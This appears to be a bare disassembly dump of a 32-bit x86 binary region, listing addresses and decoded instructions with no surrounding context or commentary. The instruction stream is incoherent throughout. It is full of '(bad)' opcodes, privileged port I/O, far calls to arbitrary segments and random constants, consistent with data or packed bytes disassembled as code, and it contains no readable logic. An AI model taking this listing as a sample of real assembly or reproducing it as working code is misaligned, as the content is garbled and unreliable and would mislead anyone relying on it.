  40efc6:	xchg   esp,eax
  40efc7:	push   esi
  40efc8:	repz leave 
  40efca:	stos   DWORD PTR es:[edi],eax
  40efcb:	jbe    0x40f038
  40efcd:	xor    al,0x9c
  40efcf:	arpl   WORD PTR [ebp+0x33],bp
  40efd2:	jo     0x40f044
  40efd4:	repnz pop ebp
  40efd6:	fcom   DWORD PTR [edi]
  40efd8:	inc    ebp
  40efd9:	aam    0x74
  40efdb:	fisubr WORD PTR [esi+0x1c9bf45e]
  40efe1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efe2:	stos   BYTE PTR es:[edi],al
  40efe3:	frstpm(287 only) 
  40efe5:	pop    esp
  40efe6:	xchg   DWORD PTR [ebx-0x50b8c926],edi
  40efec:	pop    edi
  40efed:	xor    BYTE PTR [ecx+0x779f68b2],dl
  40eff3:	mov    ebx,gs
  40eff5:	pop    esp
  40eff6:	sti    
  40eff7:	shl    cl,1
  40eff9:	mov    ecx,0x4fe78b84
  40effe:	and    esp,DWORD PTR [eax-0x20c51109]
  40f004:	sub    eax,0xb4b069f7
  40f009:	gs into 
  40f00b:	or     BYTE PTR [eax+0x1596ece2],dh
  40f011:	rol    eax,cl
  40f013:	dec    ecx
  40f014:	out    dx,al
  40f015:	dec    ebx
  40f016:	dec    edi
  40f017:	xor    al,0x53
  40f019:	mov    edi,0xe71f9a02
  40f01e:	xchg   esi,eax
  40f01f:	neg    DWORD PTR [esi-0x65]
  40f022:	out    dx,eax
  40f023:	out    dx,al
  40f024:	mov    eax,ds:0xc718bcce
  40f029:	(bad)  
  40f02a:	fwait
  40f02b:	xchg   edx,ebp
  40f02d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f02e:	xor    BYTE PTR [edx],dl
  40f030:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f031:	ror    ah,1
  40f033:	lods   eax,DWORD PTR ds:[esi]
  40f034:	cmp    eax,0x1457278c
  40f039:	xlat   BYTE PTR ds:[ebx]
  40f03a:	xor    al,0x37
  40f03c:	mov    edx,0xe410baee
  40f041:	test   al,0x6b
  40f043:	ins    DWORD PTR es:[edi],dx
  40f044:	out    0xb6,al
  40f046:	mov    bh,0x78
  40f048:	dec    ebx
  40f049:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f04a:	lods   eax,DWORD PTR ds:[esi]
  40f04b:	or     dh,0xad
  40f04e:	lock imul ecx,DWORD PTR [ecx+0x0],0x88179b8d
  40f056:	ins    DWORD PTR es:[edi],dx
  40f057:	and    bl,al
  40f059:	cmp    ah,ah
  40f05b:	and    al,0x84
  40f05d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f05e:	test   DWORD PTR [eax],esi
  40f060:	cwde   
  40f061:	xor    DWORD PTR [eax],eax
  40f063:	sbb    ecx,DWORD PTR [eax+edx*4-0x2f]
  40f067:	mov    edx,0x49cfb890
  40f06c:	mov    dh,0x43
  40f06e:	in     eax,0x46
  40f070:	test   DWORD PTR [ebp+0x13280d59],esp
  40f076:	loope  0x40f00c
  40f078:	pop    edi
  40f079:	(bad)  
  40f07b:	out    0x4e,al
  40f07d:	fstp   DWORD PTR [edx-0x21]
  40f080:	or     ch,BYTE PTR ds:0xf169ecbd
  40f086:	or     DWORD PTR [edi+0x18a797fe],0xeb6557c3
  40f090:	dec    edi
  40f091:	sub    al,0xaa
  40f093:	loopne 0x40f097
  40f095:	mov    bl,0xb9
  40f097:	and    al,0x58
  40f099:	jecxz  0x40f0cf
  40f09b:	dec    esi
  40f09c:	mov    eax,ds:0x7867b861
  40f0a1:	xor    BYTE PTR [ecx+0xd0b1366],0xbc
  40f0a8:	xchg   ebp,eax
  40f0a9:	and    BYTE PTR [edx],bl
  40f0ab:	inc    ecx
  40f0ac:	or     DWORD PTR [esi+0x34],0xffffffc3
  40f0b0:	add    DWORD PTR [edi+0x46],edx
  40f0b3:	cmp    ah,BYTE PTR [ebx-0x7b]
  40f0b6:	sub    esp,DWORD PTR [edi-0x40058f5a]
  40f0bc:	fwait
  40f0bd:	jle    0x40f0d5
  40f0bf:	les    esp,FWORD PTR [ebx]
  40f0c1:	sub    eax,0xcaea222f
  40f0c6:	xchg   edi,eax
  40f0c7:	jnp    0x40f147
  40f0c9:	xchg   edx,eax
  40f0ca:	push   cs
  40f0cb:	xchg   edi,eax
  40f0cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0cd:	push   edi
  40f0ce:	in     al,0x58
  40f0d0:	lods   al,BYTE PTR ds:[esi]
  40f0d1:	jmp    0x6d53180c
  40f0d6:	push   edi
  40f0d7:	fimul  DWORD PTR [ebp+edi*2-0x787b2f1c]
  40f0de:	adc    edi,ebx
  40f0e0:	adc    al,0x6e
  40f0e2:	inc    ebp
  40f0e3:	pop    esp
  40f0e4:	mov    esi,0x1cf8fca7
  40f0e9:	imul   edi,DWORD PTR [edx],0x5979cfd1
  40f0ef:	mov    al,ds:0x5a5ed88c
  40f0f4:	sub    DWORD PTR [ebx+0x78],edi
  40f0f7:	add    BYTE PTR [ebx+0x72e3c06f],ch
  40f0fd:	jge    0x40f11c
  40f0ff:	mov    fs,esi
  40f101:	int3   
  40f102:	inc    edx
  40f103:	call   0xbae9:0xd3d470ce
  40f10a:	sbb    ebp,DWORD PTR [esp+esi*8+0x11]
  40f10e:	xlat   BYTE PTR ds:[ebx]
  40f10f:	xchg   ecx,eax
  40f110:	jo     0x40f0e5
  40f112:	sub    edx,edi
  40f114:	adc    BYTE PTR [ebx-0x40b90b6b],bh
  40f11a:	fnop   
  40f11c:	(bad)  
  40f11d:	test   BYTE PTR ss:[eax+edi*2],bh
  40f121:	mov    bl,0x46
  40f123:	in     al,0xb9
  40f125:	shl    BYTE PTR [ecx+0x59],cl
  40f128:	cli    
  40f129:	cmp    DWORD PTR [eax-0x6c],esp
  40f12c:	xor    DWORD PTR [ebx-0x1838a49],edi
  40f132:	jmp    0x40f14e
  40f134:	dec    ecx
  40f135:	dec    ecx
  40f136:	mov    WORD PTR [eax+0x42789ddf],fs
  40f13c:	dec    esi
  40f13d:	ss scas eax,DWORD PTR es:[edi]
  40f13f:	les    eax,FWORD PTR [edi]
  40f141:	xchg   esi,eax
  40f142:	dec    esp
  40f143:	pop    ds
  40f144:	jmp    0xdc72:0x6cbe2bc
  40f14b:	sub    eax,0xd7afca95
  40f150:	xor    dl,BYTE PTR [ebx-0x4d0470af]
  40f156:	retf   
  40f157:	out    0x84,al
  40f159:	addr16 mov al,0x74
  40f15c:	jmp    FWORD PTR [ecx-0x5dc59fd8]
  40f162:	or     bh,BYTE PTR [ecx]
  40f164:	cmp    eax,0x6bd28b1
  40f169:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f16a:	arpl   cx,sp
  40f16c:	ret    0x96de
  40f16f:	xchg   DWORD PTR [esi+0x337f633a],esi
  40f175:	test   al,0xb
  40f177:	sti    
  40f178:	(bad)  
  40f179:	push   edi
  40f17a:	test   dl,0x5d
  40f17d:	inc    ebx
  40f17e:	jo     0x40f113
  40f180:	xchg   edi,eax
  40f181:	out    dx,eax
  40f182:	xchg   esp,eax
  40f183:	cmp    eax,0xb5a43827
  40f188:	pop    ebx
  40f189:	sub    al,0x97
  40f18b:	cmp    BYTE PTR [ecx],al
  40f18d:	rcl    DWORD PTR [ecx-0x766df413],0xa
  40f194:	ret    
  40f195:	jns    0x40f122
  40f197:	adc    BYTE PTR [edx-0x49daad92],dh
  40f19d:	pop    esi
  40f19e:	jb     0x40f132
  40f1a0:	pop    es
  40f1a1:	sub    bl,BYTE PTR [ebx]
  40f1a3:	adc    DWORD PTR [edi],esp
  40f1a5:	push   edx
  40f1a6:	mov    dl,0x1d
  40f1a8:	icebp  
  40f1a9:	ins    DWORD PTR es:[edi],dx
  40f1aa:	ds jae 0x40f214
  40f1ad:	xor    BYTE PTR [ebp+0x62],bl
  40f1b0:	leave  
  40f1b1:	sub    ebp,esi
  40f1b3:	lock mov edx,0xb48f323a
  40f1b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1ba:	loop   0x40f1e1
  40f1bc:	xchg   BYTE PTR [edi+0x4a6787d3],bh
  40f1c2:	mov    ebp,0xf3025236
  40f1c7:	addr16 popa 
  40f1c9:	push   0x40
  40f1cb:	aaa    
  40f1cc:	inc    esp
  40f1cd:	sbb    bl,ch
  40f1cf:	into   
  40f1d0:	cmc    
  40f1d1:	xor    BYTE PTR [eax],dl
  40f1d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1d4:	mov    edx,esp
  40f1d6:	add    al,0x15
  40f1d8:	cmp    al,0x3f
  40f1da:	sub    BYTE PTR [edi+ebp*8-0x58],al
  40f1de:	outs   dx,DWORD PTR ds:[si]
  40f1e0:	push   ebp
  40f1e1:	mov    edi,0x382a8b00
  40f1e6:	adc    eax,0x1319c1c
  40f1eb:	push   eax
  40f1ec:	push   0xffffffd9
  40f1ee:	out    dx,al
  40f1ef:	mov    fs,edx
  40f1f1:	push   0xbfb7a59
  40f1f6:	xchg   ebx,eax
  40f1f7:	xchg   esp,ecx
  40f1f9:	aas    
  40f1fa:	xor    al,0x34
  40f1fc:	ins    DWORD PTR es:[edi],dx
  40f1fd:	sbb    dl,dh
  40f1ff:	fidiv  WORD PTR [ecx+0x39]
  40f202:	mov    ebp,0xcdeb726
  40f207:	cmp    cl,bl
  40f209:	cmp    bh,BYTE PTR [edx-0x4e755b1c]
  40f20f:	lods   eax,DWORD PTR ds:[esi]
  40f210:	(bad)  
  40f211:	nop/reserved BYTE PTR ds:0x79b17c28
  40f218:	add    al,0xa4
  40f21a:	je     0x40f226
  40f21c:	(bad)  
  40f21e:	leave  
  40f21f:	fwait
  40f220:	iret   
  40f221:	mov    edi,DWORD PTR [eax-0x3a2511be]
  40f227:	test   DWORD PTR [ecx+0x78a92906],esp
  40f22d:	sbb    ebp,DWORD PTR [ebp+0x3eb656c4]
  40f233:	and    esp,DWORD PTR [esi]
  40f235:	cs ret 0x933b
  40f239:	and    DWORD PTR [ebx-0x2f],edi
  40f23c:	int    0x24
  40f23e:	xchg   esi,eax
  40f240:	mov    edx,0x6f5f283e
  40f245:	inc    ecx
  40f246:	pop    ss
  40f247:	or     DWORD PTR [esi+0x6e],edx
  40f24a:	stos   BYTE PTR es:[edi],al
  40f24b:	fidivr WORD PTR [edi-0x57]
  40f24e:	inc    ebx
  40f24f:	addr16 mov ebx,ds
  40f252:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f253:	sbb    ch,BYTE PTR ss:[esi]
  40f256:	loop   0x40f28e
  40f258:	call   0xe492:0xe750d210
  40f25f:	mov    bh,0x3b
  40f261:	and    DWORD PTR [esi+ebx*2],ebp
  40f264:	inc    eax
  40f265:	and    al,0xe1
  40f267:	adc    al,0x16
  40f269:	add    edi,esp
  40f26b:	scas   eax,DWORD PTR es:[edi]
  40f26c:	jbe    0x40f265
  40f26e:	xlat   BYTE PTR ds:[ebx]
  40f26f:	aaa    
  40f270:	sar    BYTE PTR [edi],0x9e
  40f273:	test   esi,0x25d2e0a
  40f279:	repnz push eax
  40f27b:	push   ebx
  40f27c:	dec    ebp
  40f27d:	(bad)  ds:0x7d391b8f
  40f283:	pop    ebx
  40f284:	sti    
  40f285:	pop    ebp
  40f286:	inc    ebp
  40f287:	(bad)
  40f28c:	dec    esi
  40f28d:	jle    0x40f273
  40f28f:	xor    eax,0x8408bbea
  40f294:	aam    0xf3
  40f296:	repz push es
  40f298:	sub    BYTE PTR [eax+edx*4+0x70],cl
  40f29c:	pop    eax
  40f29d:	shl    DWORD PTR [edi+ecx*1],1
  40f2a0:	pop    edi
  40f2a1:	mov    al,0x70
  40f2a3:	fild   DWORD PTR [esi+0x6cfc88f3]
  40f2a9:	(bad)  
  40f2aa:	and    eax,0x347a1dc
  40f2af:	xchg   BYTE PTR ds:0xc0972761,ah
  40f2b5:	aad    0xe6
  40f2b7:	push   0x30
  40f2b9:	xor    al,0xaf
  40f2bb:	mov    al,ss:0x51abe3f0
  40f2c1:	xchg   ebp,eax
  40f2c2:	or     DWORD PTR [edi-0x5d],edi
  40f2c5:	aad    0xc4
  40f2c7:	aas    
  40f2c8:	pop    esp
  40f2c9:	shl    BYTE PTR [edx],0x75
  40f2cc:	push   esp
  40f2cd:	mov    bh,dh
  40f2cf:	dec    eax
  40f2d0:	fwait
  40f2d1:	das    
  40f2d2:	loop   0x40f2a8
  40f2d4:	inc    edx
  40f2d5:	or     al,BYTE PTR [esp+eiz*4-0x3b366b97]
  40f2dc:	dec    esp
  40f2dd:	pop    ebx
  40f2de:	arpl   WORD PTR [edx],dx
  40f2e0:	mov    dl,BYTE PTR [ecx+0x7f627181]
  40f2e6:	int    0x61
  40f2e8:	leave  
  40f2e9:	in     al,dx
  40f2ea:	jg     0x40f28e
  40f2ec:	xchg   ebx,eax
  40f2ed:	mov    dl,0xfa
  40f2ef:	dec    eax
  40f2f0:	fild   QWORD PTR [edx+0x4a]
  40f2f3:	inc    edi
  40f2f4:	lahf   
  40f2f5:	or     al,0xe5
  40f2f7:	cld    
  40f2f8:	test   al,0x1
  40f2fa:	scas   eax,DWORD PTR es:[edi]
  40f2fb:	jns    0x40f33b
  40f2fd:	push   ebx
  40f2fe:	inc    eax
  40f2ff:	sub    ebx,DWORD PTR [eax]
  40f301:	fmul   QWORD PTR [edi+ecx*8]
  40f304:	stos   BYTE PTR es:[edi],al
  40f305:	or     BYTE PTR [esi],0x62
  40f308:	mov    al,0xbc
  40f30a:	iret   
  40f30b:	in     eax,0xcb
  40f30d:	pop    ecx
  40f30e:	mov    ah,0x8d
  40f310:	ja     0x40f32c
  40f312:	jp     0x40f2c9
  40f314:	adc    bl,BYTE PTR [esi+0x1d]
  40f317:	push   ebx
  40f318:	mov    ecx,0x606d3a9e
  40f31d:	clc    
  40f31e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f31f:	push   ecx
  40f320:	jae    0x40f351
  40f322:	add    DWORD PTR [ebp+0x76],eax
  40f325:	loopne 0x40f2b6
  40f327:	ins    DWORD PTR es:[edi],dx
  40f328:	clc    
  40f329:	repnz fnstcw WORD PTR [edx-0x4a33b5be]
  40f330:	sub    DWORD PTR ds:0x9db5243b,esi
  40f336:	mov    esi,0x56ff8b4e
  40f33b:	or     BYTE PTR [ecx],dl
  40f33d:	jp     0x40f33c
  40f33f:	jo     0x40f37c
  40f341:	pop    edi
  40f342:	retf   0x579f
  40f345:	cmp    DWORD PTR [esi],esp
  40f347:	shr    BYTE PTR [esi+0x33dacfd6],1
  40f34d:	dec    ebx
  40f34e:	pop    edx
  40f34f:	adc    dl,dh
  40f351:	add    eax,0xa1e61900
  40f356:	and    ch,BYTE PTR ds:[edi]
  40f359:	cld    
  40f35a:	dec    ebp
  40f35b:	or     BYTE PTR [ecx-0x6fac76dc],0xf1
  40f362:	out    dx,eax
  40f363:	mov    ah,0xd9
  40f365:	out    dx,al
  40f366:	xor    dl,dh
  40f368:	mov    bl,0x2d
  40f36a:	std    
  40f36b:	loop   0x40f2f8
  40f36d:	popa   
  40f36e:	push   esi
  40f36f:	out    dx,eax
  40f370:	push   esi
  40f371:	in     al,dx
  40f372:	jbe    0x40f38c
  40f374:	cwde   
  40f375:	and    BYTE PTR [ebx+0x5d],0x63
  40f379:	sbb    ch,BYTE PTR [ebx+0x9]
  40f37c:	int3   
  40f37d:	or     edx,ecx
  40f37f:	aam    0xf2
  40f381:	cmc    
  40f382:	push   eax
  40f383:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f384:	add    ah,BYTE PTR [ecx+0x7f]
  40f387:	and    al,0x29
  40f389:	add    DWORD PTR [edx-0x26],ebp
  40f38c:	sub    eax,0xc720f63a
  40f391:	stos   BYTE PTR es:[edi],al
  40f392:	jge    0x40f357
  40f394:	hlt    
  40f395:	shl    edx,1
  40f397:	pushfw 
  40f399:	call   0xc139:0xdd3c9101
  40f3a0:	test   DWORD PTR [ecx-0x48f54073],eax
  40f3a6:	(bad)  
  40f3a7:	push   edi
  40f3a8:	arpl   sp,dx
  40f3aa:	out    0x85,al
  40f3ac:	cmp    DWORD PTR [esi+0x791682b2],eax
  40f3b2:	mov    ds:0xa0bcd77,al
  40f3b7:	fisttp DWORD PTR [esp+ebx*2]
  40f3ba:	int    0x77
  40f3bc:	clc    
  40f3bd:	fcomp  QWORD PTR [ebp+ebp*8-0x7d7d8878]
  40f3c4:	push   cs
  40f3c5:	or     cl,bh
  40f3c7:	xlat   BYTE PTR ds:[ebx]
  40f3c8:	fdivr  DWORD PTR [esi]
  40f3ca:	es leave 
  40f3cc:	sar    ebx,0x7e
  40f3cf:	jne    0x40f406
  40f3d1:	mov    al,ds:0x865678b4
  40f3d6:	xor    ecx,DWORD PTR [edi]
  40f3d8:	mov    ch,0xf8
  40f3da:	mov    BYTE PTR [ebx+0x6f],dl
  40f3dd:	jae    0x40f41a
  40f3df:	(bad)  
  40f3e0:	repz dec eax
  40f3e2:	sub    BYTE PTR [ebp+0x12],al
  40f3e5:	sti    
  40f3e6:	add    eax,0x7bc6d400
  40f3eb:	call   0x6ad2ba18
  40f3f0:	iret   
  40f3f1:	xor    edi,esi
  40f3f3:	sub    eax,0xeace91cc
  40f3f8:	mov    ah,0x2c
  40f3fa:	cld    
  40f3fb:	rep ins DWORD PTR es:[edi],dx
  40f3fd:	ret    
  40f3fe:	(bad)  
  40f3ff:	sbb    dh,BYTE PTR [ecx-0x5e5d52af]
  40f405:	les    ebp,FWORD PTR [ebp+0x57]
  40f408:	inc    esp
  40f409:	shl    edx,1
  40f40b:	pop    ecx
  40f40c:	xchg   DWORD PTR ds:0xf88632bc,edi
  40f412:	adc    BYTE PTR [esp+edi*8+0x54],ch
  40f416:	arpl   ax,cx
  40f418:	outs   dx,BYTE PTR ds:[esi]
  40f419:	dec    edi
  40f41a:	xor    eax,0x9d64c7ed
  40f41f:	cmp    BYTE PTR [ebp+0x41],dl
  40f422:	in     eax,dx
  40f423:	inc    edx
  40f424:	mov    cl,0x63
  40f426:	ds jecxz 0x40f49a
  40f429:	pop    ebp
  40f42a:	add    DWORD PTR [edx+ebx*1-0x23b955c0],ebp
  40f431:	cwde   
  40f432:	in     al,dx
  40f433:	push   0xedb7849c
  40f438:	dec    eax
  40f439:	jno    0x40f483
  40f43b:	sub    eax,0x3e5e8bd9
  40f440:	push   esi
  40f441:	nop
  40f442:	js     0x40f3e4
  40f444:	cli    
  40f445:	stos   BYTE PTR es:[edi],al
  40f446:	arpl   si,sp
  40f448:	mov    ds:0x6dacccf4,eax
  40f44d:	mov    WORD PTR [ecx+0x2d],ss
  40f450:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f451:	(bad)  
  40f452:	and    eax,0xb3eb41b6
  40f457:	or     ebp,DWORD PTR [esi-0xfe688e3]
  40f45d:	mov    al,ds:0x1eaf921c
  40f462:	jnp    0x40f41a
  40f464:	fmul   DWORD PTR [ebx+0x4bb57ea7]
  40f46a:	addr16 inc esp
  40f46c:	scas   eax,DWORD PTR es:[edi]
  40f46d:	test   ecx,ebp
  40f46f:	jl     0x40f458
  40f471:	fwait
  40f472:	shr    DWORD PTR ds:0x2fa57502,1
  40f478:	adc    BYTE PTR [ebx],bh
  40f47a:	xchg   ecx,eax
  40f47b:	jns    0x40f452
  40f47d:	sub    al,0x54
  40f47f:	(bad)  
  40f480:	pop    eax
  40f481:	adc    BYTE PTR [esi+0x55cd56f6],ch
  40f487:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f488:	xchg   esp,eax
  40f489:	out    dx,eax
  40f48a:	jae    0x40f4c2
  40f48c:	mov    ds:0xe1f45842,eax
  40f491:	jno    0x40f500
  40f493:	jle    0x40f42e
  40f495:	jp     0x40f438
  40f497:	push   0xdaea72bb
  40f49c:	fist   DWORD PTR ds:0x9d5ccd63
  40f4a2:	cs out 0x82,eax
  40f4a5:	sub    ebp,DWORD PTR [eax-0x5f]
  40f4a8:	mov    ds:0xae9e0db6,al
  40f4ad:	dec    esp
  40f4ae:	aam    0xfb
  40f4b0:	add    al,0x2a
  40f4b2:	dec    edx
  40f4b3:	sahf   
  40f4b4:	retf   0xf1fb
  40f4b7:	call   0x6d1c:0xab661ae7
  40f4be:	ret    
  40f4bf:	or     eax,0x192528f1
  40f4c4:	pop    ebp
  40f4c5:	sub    al,0x7b
  40f4c7:	push   ss
  40f4c8:	cld    
  40f4c9:	dec    ebp
  40f4ca:	in     eax,dx
  40f4cb:	xchg   esp,eax
  40f4cc:	scas   eax,DWORD PTR es:[edi]
  40f4cd:	jmp    0x40f496
  40f4cf:	mov    esp,0xc7287295
  40f4d4:	and    al,0x28
  40f4d6:	scas   al,BYTE PTR es:[edi]
  40f4d7:	jecxz  0x40f526
  40f4d9:	jl     0x40f54f
  40f4db:	mov    esi,0x97df6d5
  40f4e0:	dec    ecx
  40f4e1:	sub    eax,0x4703876e
  40f4e6:	mov    bh,0xaa
  40f4e8:	cmc    
  40f4e9:	xchg   ebx,eax
  40f4ea:	cmc    
  40f4eb:	add    eax,DWORD PTR [ecx]
  40f4ed:	xchg   ebp,eax
  40f4ee:	mov    esi,0x21ca097e
  40f4f3:	fist   WORD PTR [ebx-0x133ff92c]
  40f4f9:	ret    0xb82a
  40f4fc:	std    
  40f4fd:	mov    ?,ecx
  40f4ff:	push   eax
  40f500:	xor    BYTE PTR [esi+0x4e],dh
  40f503:	sub    DWORD PTR [esi+0x2758944d],esi
  40f509:	mov    ds:0x5057bb92,al
  40f50e:	mov    DWORD PTR [ebx+0x32],ebx
  40f511:	inc    esi
  40f512:	inc    ebp
  40f513:	adc    edx,esp
  40f515:	(bad)  
  40f516:	mov    eax,0xb46d1f51
  40f51b:	test   DWORD PTR [ebx],0x90461873
  40f521:	mov    al,0x1a
  40f523:	pushf  
  40f524:	imul   edi,DWORD PTR [esi],0x1b9c601b
  40f52a:	cld    
  40f52b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f52c:	fimul  WORD PTR [edi]
  40f52e:	push   0xffffffd1
  40f530:	(bad)  
  40f531:	jns    0x40f526
  40f533:	push   es
  40f534:	dec    ebp
  40f535:	push   eax
  40f536:	dec    esp
  40f537:	mov    DWORD PTR [ebx-0x2c2c60dd],esi
  40f53d:	vunpcklps xmm7,xmm3,XMMWORD PTR [ecx-0x59cd376c]
  40f546:	lods   al,BYTE PTR ds:[esi]
  40f547:	dec    eax
  40f548:	push   0x5ca4b769
  40f54d:	inc    esi
  40f54e:	mov    ebp,0x96efc2d5
  40f553:	(bad)  
  40f554:	in     eax,dx
  40f555:	cmp    DWORD PTR [eax+0x10],eax
  40f558:	mov    ecx,DWORD PTR [edi-0x58]
  40f55b:	mov    esi,0x9a78689c
  40f560:	call   0x5fa67908
  40f565:	repz adc al,0x88
  40f568:	sub    BYTE PTR [eax+0x74],cl
  40f56b:	or     DWORD PTR [eax+0x27],esp
  40f56e:	sti    
  40f56f:	fistp  DWORD PTR [eax+ecx*4-0x171944db]
  40f576:	pop    edx
  40f577:	retf   
  40f578:	mov    ebp,eax
  40f57a:	push   0x36f81850
  40f57f:	into   
  40f580:	mov    bh,BYTE PTR [esi+0x65]
  40f583:	pop    ebx
  40f584:	scas   al,BYTE PTR es:[edi]
  40f585:	push   es
  40f586:	sub    cl,BYTE PTR [esi]
  40f588:	cdq    
  40f589:	mov    bl,0x42
  40f58b:	push   edx
  40f58c:	(bad)  
  40f58d:	inc    ah
  40f58f:	cs jg  0x40f5b5
  40f592:	and    DWORD PTR [esi],edx
  40f594:	push   ebp
  40f595:	jg     0x40f560
  40f597:	xor    edx,DWORD PTR [edx+ecx*4]
  40f59a:	sti    
  40f59b:	shl    BYTE PTR [ebp+0x4dcc9108],1
  40f5a1:	bound  edi,QWORD PTR ds:0xdd7b275d
  40f5a7:	inc    BYTE PTR [edi-0x51]
  40f5aa:	mov    cs,WORD PTR [ebx-0x3278895b]
  40f5b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5b1:	mov    edi,0xd43eb3d2
  40f5b6:	mov    dh,bl
  40f5b8:	call   0xb1f754f1
  40f5bd:	test   BYTE PTR [edi+0x75],bh
  40f5c0:	popa   
  40f5c1:	in     al,dx
  40f5c2:	adc    DWORD PTR [eax+0x53],eax
  40f5c5:	loop   0x40f55b
  40f5c7:	pop    ecx
  40f5c8:	bound  edx,QWORD PTR [ebp+0x61]
  40f5cb:	cmc    
  40f5cc:	clc    
  40f5cd:	retf   
  40f5ce:	pusha  
  40f5cf:	pop    edi
  40f5d0:	rcr    ebx,cl
  40f5d2:	mov    dl,0x3a
  40f5d4:	int3   
  40f5d5:	nop
  40f5d6:	mov    ebx,ebx
  40f5d8:	mov    ah,0x72
  40f5da:	js     0x40f595
  40f5dc:	scas   al,BYTE PTR es:[edi]
  40f5dd:	mov    eax,ds:0x39228198
  40f5e2:	lods   al,BYTE PTR ds:[esi]
  40f5e3:	mov    ch,0xe9
  40f5e5:	ret    
  40f5e6:	or     DWORD PTR [edx+0x8c03d06],esp
  40f5ec:	sti    
  40f5ed:	sbb    eax,0x7588f974
  40f5f2:	iret   
  40f5f3:	sahf   
  40f5f4:	xchg   DWORD PTR [edx],edi
  40f5f6:	std    
  40f5f7:	push   ebp
  40f5f8:	adc    esi,edx
  40f5fa:	dec    eax
  40f5fb:	sahf   
  40f5fc:	popa   
  40f5fd:	and    eax,0x67f5efa0
  40f602:	add    eax,0x71fdb0f2
  40f607:	sbb    al,0x12
  40f609:	jmp    esi
  40f60b:	dec    eax
  40f60c:	mov    edi,0xc1ffd4e5
  40f611:	stc    
  40f612:	lea    edi,ds:0xfbfc4a4a
  40f618:	dec    ebp
  40f619:	loop   0x40f5df
  40f61b:	inc    eax
  40f61c:	(bad)  
  40f61d:	mov    ch,0xa6
  40f61f:	lea    ebp,[ebx-0x54fa4508]
  40f625:	pusha  
  40f626:	icebp  
  40f627:	sbb    eax,0x90f1ba5a
  40f62c:	mov    bh,0xec
  40f62e:	sahf   
  40f62f:	dec    ecx
  40f630:	shr    DWORD PTR [eax],1
  40f632:	sub    DWORD PTR [edx+edi*1],edx
  40f635:	in     al,0xe1
  40f637:	das    
  40f638:	xchg   ebx,eax
  40f639:	call   0x45df0726
  40f63e:	cdq    
  40f63f:	scas   al,BYTE PTR es:[edi]
  40f640:	and    dl,0xf4
  40f643:	icebp  
  40f644:	aas    
  40f645:	(bad)
  40f648:	adc    al,0x52
  40f64a:	aaa    
  40f64b:	iret   
  40f64c:	int3   
  40f64d:	fistp  DWORD PTR [ecx-0x18]
  40f651:	cs pop ss
  40f653:	les    ecx,FWORD PTR es:[edx-0x69c6e637]
  40f65a:	xchg   DWORD PTR [eax],ecx
  40f65c:	and    bl,0xfd
  40f65f:	out    0x1a,al
  40f661:	mov    bh,BYTE PTR [ecx]
  40f663:	sub    BYTE PTR [esi+0x5d5f468d],bl
  40f669:	push   eax
  40f66a:	push   esi
  40f66b:	stc    
  40f66c:	fcmovne st,st(1)
  40f66e:	xor    DWORD PTR [edi],ecx
  40f670:	ja     0x40f5f6
  40f672:	push   es
  40f673:	cmp    DWORD PTR [edx],eax
  40f675:	scas   al,BYTE PTR es:[edi]
  40f676:	fisub  WORD PTR [edx]
  40f678:	mov    bh,0x7c
  40f67a:	int    0x11
  40f67c:	xchg   edi,eax
  40f67d:	sti    
  40f67e:	imul   eax,ebx,0xfffffffc
  40f681:	inc    esi
  40f682:	mov    esp,edi
  40f684:	xchg   ebp,eax
  40f685:	jne    0x40f663
  40f687:	sub    DWORD PTR [edi+0x27],ebx
  40f68a:	retf   
  40f68b:	or     ch,BYTE PTR [eax]
  40f68d:	xor    BYTE PTR [ebx],bl
  40f68f:	out    dx,al
  40f690:	push   ss
  40f691:	jo     0x40f69d
  40f693:	fimul  WORD PTR [ebx]
  40f695:	ds enter 0xb238,0x81
  40f69a:	js     0x40f694
  40f69c:	and    al,0xa8
  40f69e:	jl     0x40f65c
  40f6a0:	jno    0x40f656
  40f6a2:	add    bl,BYTE PTR [esi]
  40f6a4:	pop    esi
  40f6a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6a6:	mov    esp,0x689c59dc
  40f6ab:	dec    esi
  40f6ac:	scas   eax,DWORD PTR es:[edi]
  40f6ad:	in     al,dx
  40f6ae:	fwait
  40f6af:	dec    ebx
  40f6b0:	(bad)  
  40f6b1:	hlt    
  40f6b2:	cmc    
  40f6b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6b4:	repnz xor eax,0x20e67e17
  40f6ba:	push   esi
  40f6bb:	mov    al,BYTE PTR [eax+0x2bd26df8]
  40f6c1:	daa    
  40f6c2:	test   eax,0x374d9638
  40f6c7:	fsubr  QWORD PTR [ecx-0x25bab8cb]
  40f6cd:	sar    DWORD PTR [ebx+0xf944883],cl
  40f6d3:	cmp    ch,BYTE PTR [ecx-0x28]
  40f6d6:	cwde   
  40f6d7:	push   esp
  40f6d8:	pop    ecx
  40f6d9:	ja     0x40f6af
  40f6db:	mov    cl,0xa3
  40f6dd:	and    DWORD PTR [ebp-0x4f],ecx
  40f6e0:	enter  0xf518,0x50
  40f6e4:	cmp    DWORD PTR [eax],0x49144285
  40f6ea:	mov    esi,0xc8ed9ad3
  40f6ef:	mov    eax,ds:0x8ba83e1b
  40f6f4:	xlat   BYTE PTR ds:[ebx]
  40f6f5:	ret    0xbad7
  40f6f8:	jb     0x40f731
  40f6fa:	ds ret 0x3438
  40f6fe:	push   edi
  40f6ff:	pop    ebp
  40f700:	aaa    
  40f701:	xor    eax,0x739a093c
  40f706:	ds pop es
